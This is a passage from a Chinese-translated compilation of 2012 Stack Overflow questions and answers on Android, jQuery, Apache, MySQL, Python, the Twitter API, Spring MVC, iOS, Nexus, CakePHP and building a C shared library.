2.  打开命令行并执行 regsvr32.exe cddareader.ax
3.  重启

此代码在 WinXP x86 和 Win7 x64 上测试。Linux机器播放音频CD没有问题（使用不同的路径）

希望这些信息有用

# android - 处理显示方向android的变化

> ID：11309370
> 
> 赞同：0
> 
> 时间：2012-07-03T10:51:02.850
> 
> 标签：android

我已经锁定了我的显示方向

```
 this.setRequestedOrientation(
            ActivityInfo.SCREEN_ORIENTATION_LANDSCAPE); 
```

在我的`onCreate()`方法中，这当然可以正常工作。现在我想处理我的显示方向的变化。我想以与在 android 相机中实现的方式相同的方式旋转 ImageView。有任何想法吗？多谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-03T10:55:20.027

在您的清单中，您可以将此属性添加到您要检查的活动中：

```
<activity android:name=".MyActivity"
      android:configChanges="orientation"
      android:label="@string/app_name" /> 
```

而您的活动代码只是覆盖此方法：

```
@Override
public void onConfigurationChanged(Configuration newConfig) {
     super.onConfigurationChanged(newConfig);

     // Checks the orientation of the screen
    if (newConfig.orientation == Configuration.ORIENTATION_LANDSCAPE) {
        Toast.makeText(this, "landscape", Toast.LENGTH_SHORT).show();
    } else if (newConfig.orientation == Configuration.ORIENTATION_PORTRAIT){
        Toast.makeText(this, "portrait", Toast.LENGTH_SHORT).show();
    }
} 
```

以供参考：

[http://developer.android.com/guide/topics/resources/runtime-changes.html](http://developer.android.com/guide/topics/resources/runtime-changes.html)

# jquery - 设置选择索引

> ID：11309374
> 
> 赞同：2
> 
> 时间：2012-07-03T10:51:27.740
> 
> 标签：jquery

我知道我可以通过执行在选择框中选择一个选项

```
$('#selectBox :nth-child(4)').attr('selected', 'selected'); 
```

但是我怎样才能通过返回的 jQuery 对象来做到这一点呢？例如类似的东西

```
var box = $('#selectBox');
$(box  :nth-child(4)').attr('selected', 'selected'); 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-07-03T10:52:31.070

您可以使用[`children`](http://api.jquery.com/children/)：

```
box.children(':nth-child(4)').attr('selected', 'selected'); 
```

顺便说一句，从 jQuery 1.6 开始，您可以[`prop`](http://api.jquery.com/prop/)使用`attr`：

```
box.children(':nth-child(4)').prop('selected', true); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-03T10:53:42.863

您可以将选择器与上下文一起使用，例如：

```
$(':nth-child(4)', box).attr('selected', 'selected'); 
```

***PS：***`.val()`如果您知道选项值，则可以使用

```
$('#selectBox').val(the_value); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-03T10:53:49.480

```
box.find(':nth-child(4)')[0].selected = true; 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-07-03T10:54:24.877

您可能想为此使用[prop()](http://api.jquery.com/prop/)。

```
var box = $('#selectBox');
box.children(':nth-child(4)').prop('selected', 'selected'); 
```

# apache - 无法打开配置文件 /etc/apache2/apache2.conf：没有这样的文件或目录

> ID：11309378
> 
> 赞同：1
> 
> 时间：2012-07-03T10:51:31.380
> 
> 标签：apache, ubuntu, lamp, utorrent

我刚刚安装了 Ubuntu 并从 LAMP 开始。

我安装了它，它工作得很好，直到我安装了 uTorrent。然后在 localhost 没有打开之后，我尝试停止 apache 并再次使用它重新启动。

我用过 - sudo service apache2 restart

现在这个错误来了 - 无法打开配置文件/etc/apache2/apache2.conf：没有这样的文件或目录

我在那里查了一下，没有这个名字的文件。

安装的 uTorrent 正在 8080 端口上运行...会不会有问题？

我真的不知道该怎么办。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-03T12:16:18.363

有 /etc/apache2/httpd.conf 吗？

如果有，请查看其中包含的内容，即查找以下内容：

```
Include /etc/apache2/apache2.conf 
```

`Include`基本上由于conf 文件中的指令中的路径名不正确而引发错误

# mysql - 从 SQL 中的多个字段中将值插入到一个字段中

> ID：11309383
> 
> 赞同：2
> 
> 时间：2012-07-03T10:52:17.670
> 
> 标签：mysql, sql

我有一张大桌子，大约有 200 个字段。从其中创建维度表时，大约有 100 个字段将映射到一个字段。问题是我必须像 100 个插入语句一样将这 100 个字段的值一一添加。有没有像循环或其他东西可以让我更有效地实现这一目标？

下面是代码示例：

```
 insert into DimTableA(visit_no, patient, facility, icd9, icd9_flag, ip_op)
    select D.registration, D3.med_number, D3.Hosp_Id, D.final_diagnosis_18,'d',IF(D3.Admit_Type in(1,2,3),'Inpatient','Outpatient'),
    from svch_dischs3_s D3, svch_diags_s D

    insert into DimTableA(visit_no, patient, facility, icd9, icd9_flag, ip_op)
    select D.registration, D3.med_number, D3.Hosp_Id, D.final_diagnosis_19,'d',IF(D3.Admit_Type in(1,2,3),'Inpatient','Outpatient'),
    from svch_dischs3_s D3, svch_diags_s D

    insert into DimTableA(visit_no, patient, facility, icd9, icd9_flag, ip_op)
    select D.registration, D3.med_number, D3.Hosp_Id, D.final_diagnosis_20,'d',IF(D3.Admit_Type in(1,2,3),'Inpatient','Outpatient'),
    from svch_dischs3_s D3, svch_diags_s D; 
```

......... 等等

唯一更改的字段名称是“icd9”输入（即 D.final_diagnosis_18、final_diagnosis_19、final_diagnosis_20 ....）

小伙子们，任何帮助将不胜感激。:)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-03T13:21:45.720

您可以使用交叉连接将这些列取消旋转到一组固定的数字，如下所示：

```
insert into DimTableA (
  visit_no,
  patient,
  facility,
  icd9,
  icd9_flag,
  ip_op
)
select
  D.registration,
  D3.med_number,
  D3.Hosp_Id,
  case N.number
    when 1 then D.final_diagnosis_18
    when 2 then D.final_diagnosis_19
    when 3 then D.final_diagnosis_20
    ...
  end,
  'd',
  IF(D3.Admit_Type in(1,2,3),'Inpatient','Outpatient')
from
  svch_dischs3_s D3,
  svch_diags_s D,
  (
    select 1 as number union all
    select 2           union all
    select 3           union all
    ...  /* up to the number of columns to unpivot */
  ) N 
```

您可以[创建和填充持久数字表](https://stackoverflow.com/questions/9751318/creating-a-numbers-table-in-mysql "在 mysql 中创建“数字表”")而不是内联视图，并在查询中使用该表的必要子集。在这种情况下，查询会像这样改变

```
...
from
  svch_dischs3_s D3,
  svch_diags_s D,
  numbers N
where N.number between 1 and … /* the number of columns to unpivot */ 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-03T11:51:27.133

您可以尝试在子选择中运行`INSERT`带有a 的单曲。[`UNION`](http://dev.mysql.com/doc/refman/5.1/en/union.html)

您当前的 SQL 中有一个[笛卡尔连接](http://dev.mysql.com/doc/refman/5.5/en/join.html)，所以我猜测您在某处缺少连接。无论如何，这应该让您了解我在做什么：

```
insert into DimTableA(visit_no, patient, facility, icd9, icd9_flag, ip_op)
select D.registration, D3.med_number, D3.Hosp_Id, D.final_diagnosis_18,'d',IF(D3.Admit_Type in(1,2,3),'Inpatient','Outpatient')
from svch_dischs3_s D3, svch_diags_s D
-- where D3.???? = D.????
union
select D.registration, D3.med_number, D3.Hosp_Id, D.final_diagnosis_19,'d',IF(D3.Admit_Type in(1,2,3),'Inpatient','Outpatient')
from svch_dischs3_s D3, svch_diags_s D
-- where D3.???? = D.????
union
select D.registration, D3.med_number, D3.Hosp_Id, D.final_diagnosis_20,'d',IF(D3.Admit_Type in(1,2,3),'Inpatient','Outpatient')
from svch_dischs3_s D3, svch_diags_s D
-- where D3.???? = D.????; 
```

这是一个更理论的例子：

```
create table dimTable
(id int unsigned not null default 0,
field varchar(50)
);

create table sourceTable
(id int unsigned not null default 0,
field1 varchar(50),
field2 varchar(50),
field3 varchar(50),
field4 varchar(50),
field5 varchar(50)
);

insert into sourceTable (id,field1,field2,field3,field4,field5) values (1,"hello","these","are","some","values");
insert into sourceTable (id,field1,field2,field3,field4,field5) values (2,"hello2","these2","are2","some2","values2");
insert into sourceTable (id,field1,field2,field3,field4,field5) values (3,"hello3","these3","are3","some3","values3");
insert into sourceTable (id,field1,field2,field3,field4,field5) values (4,"hello4","these4","are4","some4","values4");
insert into sourceTable (id,field1,field2,field3,field4,field5) values (5,"hello5","these5","are5","some5","values5");

insert into dimTable (id, field)
select id,field1 from sourceTable
union
select id,field2 from sourceTable
union
select id,field3 from sourceTable
union
select id,field4 from sourceTable
union
select id,field5 from sourceTable;

select *
from dimTable; 
```

希望能帮助到你！

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-03T13:30:05.833

存储过程可以解决您的问题。您可能只需要传递要插入的字段值和字段的*后缀*`D.final_diagnosis_`。

示例代码片段如下所示：

```
drop procedure if exists proc_insert_icd9;
delimiter //
create procedure proc_insert_icd9( final_diagnosis_suffix int )
    begin
        declare suffixId int;
        declare sql_insert_str varchar( 255 );
        declare sql_select_str varchar( 255 );
        declare sql_temp varchar( 255 );
        set suffixId = final_diagnosis_suffix;

        set sql_insert_str = 'insert into DimTableA(visit_no, patient, facility, icd9, icd9_flag, ip_op) ';
        set sql_select_str = concat( 'select D.registration, D3.med_number, D3.Hosp_Id, D.final_diagnosis_', suffixId, ', ''d'', IF(D3.Admit_Type in(1,2,3), ''Inpatient'', ''Outpatient'' ) from svch_dischs3_s D3, svch_diags_s D' );

        select concat( sql_insert_str, sql_select_str ) into @sql_temp;

        prepare stmt from @sql_temp;
        execute stmt;
    end;
//
delimiter ; 
```

`final_diagnosis`现在尝试使用正确的字段后缀值作为参数多次调用您需要的过程。
**示例**：

```
call proc_insert_icd9( 18 );
call proc_insert_icd9( 19 ); 
```

**注意**：您可以修改程序以包括

1.  更多输入参数来处理 where 子句等。
2.  select 语句的 where 子句。

# python - 在 python 中读取 .dat 文件时出错

> ID：11309384
> 
> 赞同：0
> 
> 时间：2012-07-03T10:52:20.473
> 
> 标签：python, file-io, numpy

我尝试使用以下代码段在 python 中读取 .dat 文件：

```
old = numpy.loadtxt('C:\Users\Downloads\new.dat',delimiter=',') 
```

这给出了以下错误：

```
[Errno 22] invalid mode ('U') or filename:'C:\\Users\\Downloads\new.dat' 
```

但是，它适用于许多其他 .dat 文件。谁能告诉我问题是什么？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2015-05-03T15:04:17.093

阅读此内容，如前所述，原始字符串。 [https://pythonconquerstheuniverse.wordpress.com/2008/06/04/gotcha-%E2%80%94-backslashes-in-windows-filenames/](https://pythonconquerstheuniverse.wordpress.com/2008/06/04/gotcha-%E2%80%94-backslashes-in-windows-filenames/)

# android - Android 设备屏幕无法打开

> ID：11309385
> 
> 赞同：0
> 
> 时间：2012-07-03T10:52:24.107
> 
> 标签：android, android-2.2-froyo, wakelock

我正在开发一个应用程序来显示视频。BroadCastReceiver 接收到 AC_PPWER_CONNECTED 并启动 VideoViewActivity。我可以听到视频的声音，但屏幕关闭，或者我想用哇合锁打开它。

以下代码不起作用。

```
package org.adem.activities;

import java.util.ArrayList;
import org.adem.R;

import android.app.Activity;
import android.app.KeyguardManager;
import android.app.KeyguardManager.KeyguardLock;
import android.content.Context;
import android.media.AudioManager;
import android.media.MediaPlayer;
import android.media.MediaPlayer.OnBufferingUpdateListener;
import android.media.MediaPlayer.OnCompletionListener;
import android.media.MediaPlayer.OnPreparedListener;
import android.media.MediaPlayer.OnVideoSizeChangedListener;
import android.os.Bundle;
import android.os.PowerManager;
import android.util.Log;
import android.view.SurfaceHolder;
import android.view.SurfaceView;
import android.view.Window;
import android.view.WindowManager;
import android.widget.Toast;

public class VideoViewActivity extends Activity implements
        OnBufferingUpdateListener, OnCompletionListener,
        OnPreparedListener, OnVideoSizeChangedListener, SurfaceHolder.Callback {

    private static final String TAG = VideoViewActivity.class.getSimpleName();
    private int mVideoWidth;
    private int mVideoHeight;
    private MediaPlayer mMediaPlayer;
    private SurfaceView mPreview;
    private SurfaceHolder holder;
    private Bundle extras;
    private boolean mIsVideoSizeKnown = false;
    private boolean mIsVideoReadyToBePlayed = false;
    private ArrayList<String> pathList;
    private int videoQueueSize;
    private int currentPosition;
    PowerManager.WakeLock wl;
    KeyguardLock lock;

    /**
     * 
     * Called when the activity is first created.
     */
    @Override
    public void onCreate(Bundle savedInstance) {
        super.onCreate(savedInstance);
        requestWindowFeature(Window.FEATURE_NO_TITLE);
        this.getWindow().setFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN, WindowManager.LayoutParams.FLAG_FULLSCREEN);
        this.getWindow().addFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON);
        setContentView(R.layout.player);

        PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
        wl = pm.newWakeLock(PowerManager.SCREEN_BRIGHT_WAKE_LOCK, TAG);

        KeyguardManager keyguardManager = (KeyguardManager) getSystemService(Activity.KEYGUARD_SERVICE);
        lock = keyguardManager.newKeyguardLock(KEYGUARD_SERVICE);
        lock.disableKeyguard();

        mPreview = (SurfaceView) findViewById(R.id.surfaceView);
        holder = mPreview.getHolder();
        holder.addCallback(this);
        holder.setType(SurfaceHolder.SURFACE_TYPE_PUSH_BUFFERS);
        extras = getIntent().getExtras();
    }

    private void playVideo() {

        if ("".equals(pathList.get(currentPosition))) {
            // Tell the user to provide a media file URL.
            Toast.makeText(
                    VideoViewActivity.this,
                    "Please edit MediaPlayerDemo_Video Activity, "
                    + "and set the path variable to your media file path."
                    + " Your media file must be stored on sdcard.",
                    Toast.LENGTH_LONG).show();
            return;

        } else {
            try {

                // Create a new media player and set the listeners
                releaseMediaPlayer();
                mMediaPlayer = new MediaPlayer();
                mMediaPlayer.setScreenOnWhilePlaying(true);
                mMediaPlayer.setDataSource(pathList.get(currentPosition));
                mMediaPlayer.setDisplay(holder);
                mMediaPlayer.prepare();
                mMediaPlayer.setOnBufferingUpdateListener(this);
                mMediaPlayer.setOnCompletionListener(this);
                mMediaPlayer.setOnPreparedListener(this);
                mMediaPlayer.setOnVideoSizeChangedListener(this);
                mMediaPlayer.setAudioStreamType(AudioManager.STREAM_MUSIC);

            } catch (Exception e) {
                Log.e(TAG, "error: " + e.getMessage(), e);
            }
        }
    }

    public void onBufferingUpdate(MediaPlayer arg0, int percent) {
        Log.d(TAG, "onBufferingUpdate percent:" + percent);

    }

    public void onCompletion(MediaPlayer arg0) {
        if (currentPosition >= videoQueueSize) {
            Toast.makeText(VideoViewActivity.this, "Video Playback finished", Toast.LENGTH_LONG).show();
            this.finish();
        } else {
            playVideo();
            currentPosition++;
        }
        Log.d(TAG, "onCompletion called");
    }

    public void onVideoSizeChanged(MediaPlayer mp, int width, int height) {
        Log.v(TAG, "onVideoSizeChanged called");
        if (width == 0 || height == 0) {
            Log.e(TAG, "invalid video width(" + width + ") or height(" + height + ")");
            return;
        }
        mIsVideoSizeKnown = true;
        mVideoWidth = width;
        mVideoHeight = height;
        if (mIsVideoReadyToBePlayed && mIsVideoSizeKnown) {
            startVideoPlayback();
        }
    }

    public void onPrepared(MediaPlayer mediaplayer) {
        Log.d(TAG, "onPrepared called");
        mIsVideoReadyToBePlayed = true;
        if (mIsVideoReadyToBePlayed && mIsVideoSizeKnown) {
            startVideoPlayback();
        }
    }

    public void surfaceChanged(SurfaceHolder surfaceholder, int i, int j, int k) {
        Log.d(TAG, "surfaceChanged called");

    }

    public void surfaceDestroyed(SurfaceHolder surfaceholder) {
        Log.d(TAG, "surfaceDestroyed called");
    }

    public void surfaceCreated(SurfaceHolder holder) {
        Log.d(TAG, "surfaceCreated called");
        pathList = extras.getStringArrayList("Path");
        currentPosition = 0;
        videoQueueSize = pathList.size();
        if (!wl.isHeld()) {
            Log.d(TAG, "surfaceCreated - wl.acquire()");
            wl.acquire();
        }
        playVideo();
        Log.d(TAG, pathList.get(currentPosition));
        currentPosition++;

    }

    @Override
    protected void onPause() {
        super.onPause();
        releaseMediaPlayer();
        doCleanUp();
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        releaseMediaPlayer();
        doCleanUp();
    }

    private void releaseMediaPlayer() {
        if (mMediaPlayer != null) {
            mMediaPlayer.release();
            mMediaPlayer = null;
        }
    }

    private void doCleanUp() {
        mVideoWidth = 0;
        mVideoHeight = 0;
        mIsVideoReadyToBePlayed = false;
        mIsVideoSizeKnown = false;
        if (wl.isHeld()) {
            Log.d(TAG, "doCleanUp - wl.release()");
            wl.release();
        }
    }

    private void startVideoPlayback() {
        Log.v(TAG, "startVideoPlayback");
        holder.setFixedSize(mVideoWidth, mVideoHeight);
        mMediaPlayer.start();
    }
} 
```

唤醒锁定命令有什么问题。我想知道的是，当在 doCleanUp 方法的 ent 处调用 wl.release 时，屏幕会打开。

感谢帮助

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-03T11:08:27.220

在片段下面试试这个：

```
getWindow().addFlags(WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED);
powerManager = (PowerManager) getSystemService(Context.POWER_SERVICE);
wakeLock = powerManager.newWakeLock(PowerManager.SCREEN_DIM_WAKE_LOCK
            | PowerManager.ACQUIRE_CAUSES_WAKEUP, "WakeClock"); 
```

# android - ics 更新设备中的问题

> ID：11309387
> 
> 赞同：0
> 
> 时间：2012-07-03T10:52:24.713
> 
> 标签：android

最近我开始收到来自我的用户的电子邮件，他们的手机已更新为 ics，现在他们使用我的应用程序保存的图像在此之后不再显示在 android 的图库应用程序中。他们说使用文件资源管理器可以查看文件，但不能使用图库应用程序，并且在 ics 更新之前他们没有遇到任何此类问题。

在 onMediaScannerConnected 事件之后，我肯定会使用 MediaScannerConnection 调用 scanFile。

**更新**：我忘了提到图像 mime 类型设置为“image/*”而不是“image/jpeg”或“image/png”。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-09T12:56:49.243

我找到了答案。这是因为设置了“image/*”mime 类型。在 ICS 中无法识别，并且在某些设备中，图库应用程序无法识别此 mime 类型，将 mime 类型设置为 null 可以解决此问题。

# twitter - 向 Twitter 发出 POST 请求

> ID：11309392
> 
> 赞同：0
> 
> 时间：2012-07-03T10:52:39.027
> 
> 标签：twitter, twitter-oauth

我在 Twitter 中创建 POST 请求（发送推文）时遇到问题。我不想使用任何库。我拥有所有 oauth 所需的参数，但在执行时仍然无法执行有效请求

```
curl "https://api.twitter.com/1/statuses/update.json?oauth_signature=NCs%2B1unOYZQW%2BNCTmsRwmiqtrZQ%3D&oauth_version=1.0&oauth_nonce=-619997894&oauth_signature_method=HMAC-SHA1&oauth_consumer_key=gGrr4khdilkzano8gYxK4Q&oauth_token=146439820-n07FzSB78bDWEUzPPP9WZnwdnwW917FyJi1gwKWM&oauth_timestamp=1341309839" -d 'status=hello' 
```

然后我得到“无法验证你。”，“请求”：“/1/statuses/update.json”

我知道 OAuth 参数是正确的，因为我可以像

```
https://api.twitter.com/1/statuses/public_timeline.json?oauth_signature=NCs%2B1unOYZQW%2BNCTmsRwmiqtrZQ%3D&oauth_version=1.0&oauth_nonce=-619997894&oauth_signature_method=HMAC-SHA1&oauth_consumer_key=gGrr4khdilkzano8gYxK4Q&oauth_token=146439820-n07FzSB78bDWEUzPPP9WZnwdnwW917FyJi1gwKWM&oauth_timestamp=1341309839 
```

它工作得很好。所以请帮我解决这个问题。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-03T17:52:15.973

您的第二个请求有效，因为它不需要身份验证。

当您必须对请求进行身份验证时，您应该使用`Authorization`如下所述的 HTTP 标头来执行此操作：[https ://dev.twitter.com/docs/auth/authorizing-request](https://dev.twitter.com/docs/auth/authorizing-request)

# java - Spring MVC 模型生命周期

> ID：11309394
> 
> 赞同：3
> 
> 时间：2012-07-03T10:52:44.303
> 
> 标签：java, spring, spring-mvc

我对 Spring MVC 中的模型行为有疑问。

我有一个带有处理程序方法的控制器类，例如：

```
@RequestMapping(value = "/result", method = RequestMethod.GET)
public String getExportResults(@RequestParam("token") String token,
        Model model) {

        // ...

        model.addAttribute("task", myObject);

        // ...
}

@RequestMapping(value = "/file", method = RequestMethod.GET)
public void getFile(Model model, HttpServletResponse response)

    // can't find "task" attribute...

} 
```

当我将`"task"`属性放入`model`时，`getExportResults`我希望在`getFile`方法的模型参数中找到它，但是当我尝试获取它时，它`"task"`是**null**。我错了吗？也许模型行为对我来说不是很清楚......

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-07-03T11:02:01.287

你的期望是错误的。将某些内容放入模型中使其仅可用于当前请求。将某些内容添加到模型中的目的是使其可用于视图，以便生成 HTML 页面。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-03T11:00:25.647

每个请求都会初始化模型，每个请求都会创建一个新的模型对象。您添加任务对象的模型与您在 getFile 方法中获得的模型对象不同。

如果这些是 2 个不同的请求，看起来像，您可能希望将任务对象放入会话并从那里检索它。

# objective-c - 为什么应用程序崩溃而不在控制台中打印任何内容？

> ID：11309395
> 
> 赞同：1
> 
> 时间：2012-07-03T10:52:45.487
> 
> 标签：objective-c, ios

我的 iOS 应用程序随机崩溃，但我在控制台中没有收到任何警告/错误。我认为这可能是内存泄漏，但我至少不应该收到 EXC_BAD_ACCESS 错误吗？

另一件事可能是内存过载，但我没有收到任何内存警告，我刚刚使用工具工具测试了该应用程序。

那么为什么它会崩溃而不在控制台中打印任何内容呢？

谢谢

更新：我实际上在仪器中收到了内存警告，尽管我没有看到内存增加。可能是坠机的原因？我怎么知道内存警告在哪里生成？（见截图：）

![在此处输入图像描述](../Images/fa7f5a28ed5698e88ccd1fdd9610a6a2.png)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-03T12:32:47.520

告诉您的程序在每次收到内存不足警告时打印回溯。

来自 Apple 文档：

> UIKit 提供了几种接收内存不足通知的方法，包括以下几种：
> 
> *   实现`applicationDidReceiveMemoryWarning:`您的应用程序委托的方法。
> *   覆盖`didReceiveMemoryWarning`自定义 UIViewController 子类中的方法。
> *   注册以接收 `UIApplicationDidReceiveMemoryWarningNotification`通知。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-03T11:50:20.443

启用僵尸对象并重试。[https://stackoverflow.com/a/8050701/1271579](https://stackoverflow.com/a/8050701/1271579)

编辑：如果设备内存不足，您将在崩溃前收到一些内存警告，因此您可能应该对其进行优化。

# maven - Sonatype Nexus 是否可以配置为限制用户可以部署的工件？

> ID：11309398
> 
> 赞同：6
> 
> 时间：2012-07-03T10:53:01.413
> 
> 标签：maven, nexus

我已经安装了 Nexus 2.0.6，并且与我的 LDAP 服务器的集成正在运行（仅限身份验证）。有没有办法配置 Nexus，以便只有一组开发人员能够部署给定的工件或组？

我基本上不希望团队 A 中的开发人员部署团队 B 负责的工件。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-07-03T16:10:56.707

[您可以使用此 Sonatype 博客文章](http://www.sonatype.com/people/2010/02/how-to-partition-nexus-repositories-targets-privileges-and-roles/)中描述的存储库目标、权限和角色对存储库进行分区。几个月前我对此进行了测试，它似乎运行良好。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-08-08T15:17:59.527

在 Nexus 2.0.1 下，这是我已经完成并验证的解决方案。

警告：
这允许将“工件上传”选项限制为目录层次结构。
这与“部署”或与“发布准备”结合使用并不完全相同。

脚步：

1.  从目前拥有它的所有用户中删除“工件上传”的单一特权，即您不想拥有它。

2.  创建包含要授予访问权限的目录掩码的“Repository-Target”。前任。 `.*/com/mycompany/target-dir/.*`
    仔细检查掩码，它以句点星号开头并以句点星号结尾。

3.  创建映射到您刚刚创建的 Repository-Target 的“Repository-Privilege”。通常，我在此存储库特权名称中包含存储库名称，例如“releases.com.mycompany.target-dir”。这将为所述目录创建 CRUD 条目 (4)。

4.  接下来，根据您刚刚创建的存储库权限 (4) 创建“角色”，**加上**“工件上传”。该角色共有 5 个条目。使用此处的“应用过滤器”来帮助您找到这些项目。我将此角色命名为“Upload.Role.Releases.Target-Dir”。同样，完成后，该角色应该有 5 个条目：
    Artifact Upload
    com.mycompany.target-dir(create)
    com.mycompany.target-dir(delete)
    com.mycompany.target-dir(read)
    com.mycompany.target -dir(update)

    这是将上传角色限制到此 repo.directory 的原因。

5.  如果用户不存在，则创建用户，分配密码。

6.  给用户以下角色：
    Nexus Deployment
    Repo：所有 Maven 存储库（读取）
    UI：基本 UI 权限
    Upload.Role.Relases.Target-Dir

点击保存，你就知道了。稍后，您可以使用相同的方法为其他存储库（例如快照或第 3 方）创建新角色，并保持相同的目录掩码。

# unit-testing - 单元测试 Cakephp 插件

> ID：11309402
> 
> 赞同：1
> 
> 时间：2012-07-03T10:53:20.510
> 
> 标签：unit-testing, cakephp, cakephp-2.0

有没有可能我可以测试 CakePHP 插件？

我所有的核心控制器和模型测试都工作正常，但是当我尝试测试插件的控制器时，它给了我错误：

> 试图获取非对象的属性

请参阅下面的代码：

```
public function testTest() {
        $result   = $this->testAction("/MyPluginController/trst",array("return"=>"vars"));
        debug($result);
} 
```

有任何想法吗？
先感谢您

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-11T18:24:29.127

你`App::uses`在顶部添加了吗？

`App::uses('ControllerNameController', 'MyPlugin.Controller');`

# c - 编译共享库时-fPIC是什么意思

> ID：11309404
> 
> 赞同：0
> 
> 时间：2012-07-03T10:53:36.640
> 
> 标签：c, linux, shared-libraries

我正在尝试在 linux 中创建一个共享库，但在尝试编译时出现以下错误：

```
relocation R_X86_64_32S against `.rodata' can not be used when making a shared object; recompile with -fPIC 
```

如果我删除**GetCrc16**的内容，它可以工作。我究竟做错了什么 ？

```
/*
 * main.c
 *
 *  Created on: Jul 3, 2012
 *      Author: opc0de
 */

#include <sys/types.h>
#include <sys/stat.h>
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <netinet/in.h>
#include <resolv.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <errno.h>
#include <unistd.h>
#include <syslog.h>
#include <string.h>
#include <mysql/mysql.h>
#include <arpa/inet.h>
#include <curl/curl.h>

typedef struct param
{
    int * csock;
    char * IMEI;
}param;

#define DAEMON_NAME "MEGA_TRACKER"

static const unsigned short crctab16[] =
{
0X0000, 0X1189, 0X2312, 0X329B, 0X4624, 0X57AD, 0X6536, 0X74BF,
0X8C48, 0X9DC1, 0XAF5A, 0XBED3, 0XCA6C, 0XDBE5, 0XE97E, 0XF8F7,
0X1081, 0X0108, 0X3393, 0X221A, 0X56A5, 0X472C, 0X75B7, 0X643E,
0X9CC9, 0X8D40, 0XBFDB, 0XAE52, 0XDAED, 0XCB64, 0XF9FF, 0XE876,
0X2102, 0X308B, 0X0210, 0X1399, 0X6726, 0X76AF, 0X4434, 0X55BD,
0XAD4A, 0XBCC3, 0X8E58, 0X9FD1, 0XEB6E, 0XFAE7, 0XC87C, 0XD9F5,
0X3183, 0X200A, 0X1291, 0X0318, 0X77A7, 0X662E, 0X54B5, 0X453C,
0XBDCB, 0XAC42, 0X9ED9, 0X8F50, 0XFBEF, 0XEA66, 0XD8FD, 0XC974,
0X4204, 0X538D, 0X6116, 0X709F, 0X0420, 0X15A9, 0X2732, 0X36BB,
0XCE4C, 0XDFC5, 0XED5E, 0XFCD7, 0X8868, 0X99E1, 0XAB7A, 0XBAF3,
0X5285, 0X430C, 0X7197, 0X601E, 0X14A1, 0X0528, 0X37B3, 0X263A,
0XDECD, 0XCF44, 0XFDDF, 0XEC56, 0X98E9, 0X8960, 0XBBFB, 0XAA72,
0X6306, 0X728F, 0X4014, 0X519D, 0X2522, 0X34AB, 0X0630, 0X17B9,
0XEF4E, 0XFEC7, 0XCC5C, 0XDDD5, 0XA96A, 0XB8E3, 0X8A78, 0X9BF1,
0X7387, 0X620E, 0X5095, 0X411C, 0X35A3, 0X242A, 0X16B1, 0X0738,
0XFFCF, 0XEE46, 0XDCDD, 0XCD54, 0XB9EB, 0XA862, 0X9AF9, 0X8B70,
0X8408, 0X9581, 0XA71A, 0XB693, 0XC22C, 0XD3A5, 0XE13E, 0XF0B7,
0X0840, 0X19C9, 0X2B52, 0X3ADB, 0X4E64, 0X5FED, 0X6D76, 0X7CFF,
0X9489, 0X8500, 0XB79B, 0XA612, 0XD2AD, 0XC324, 0XF1BF, 0XE036,
0X18C1, 0X0948, 0X3BD3, 0X2A5A, 0X5EE5, 0X4F6C, 0X7DF7, 0X6C7E,
0XA50A, 0XB483, 0X8618, 0X9791, 0XE32E, 0XF2A7, 0XC03C, 0XD1B5,
0X2942, 0X38CB, 0X0A50, 0X1BD9, 0X6F66, 0X7EEF, 0X4C74, 0X5DFD,
0XB58B, 0XA402, 0X9699, 0X8710, 0XF3AF, 0XE226, 0XD0BD, 0XC134,
0X39C3, 0X284A, 0X1AD1, 0X0B58, 0X7FE7, 0X6E6E, 0X5CF5, 0X4D7C,
0XC60C, 0XD785, 0XE51E, 0XF497, 0X8028, 0X91A1, 0XA33A, 0XB2B3,
0X4A44, 0X5BCD, 0X6956, 0X78DF, 0X0C60, 0X1DE9, 0X2F72, 0X3EFB,
0XD68D, 0XC704, 0XF59F, 0XE416, 0X90A9, 0X8120, 0XB3BB, 0XA232,
0X5AC5, 0X4B4C, 0X79D7, 0X685E, 0X1CE1, 0X0D68, 0X3FF3, 0X2E7A,
0XE70E, 0XF687, 0XC41C, 0XD595, 0XA12A, 0XB0A3, 0X8238, 0X93B1,
0X6B46, 0X7ACF, 0X4854, 0X59DD, 0X2D62, 0X3CEB, 0X0E70, 0X1FF9,
0XF78F, 0XE606, 0XD49D, 0XC514, 0XB1AB, 0XA022, 0X92B9, 0X8330,
0X7BC7, 0X6A4E, 0X58D5, 0X495C, 0X3DE3, 0X2C6A, 0X1EF1, 0X0F78,
};

unsigned char response[] = { 0x78, 0x78, 0x05 , 0x00 ,0x00, 0x00, 0x00, 0x00,0x0D, 0x0A};
char Hexars[] = {'0', '1', '2', '3', '4', '5','6', '7', '8', '9', 'a', 'b','c', 'd', 'e', 'f' };

unsigned short GetCrc16(const unsigned char* pData, int nLength)
{
unsigned short fcs = 0xffff; // initialize
while(nLength>0){
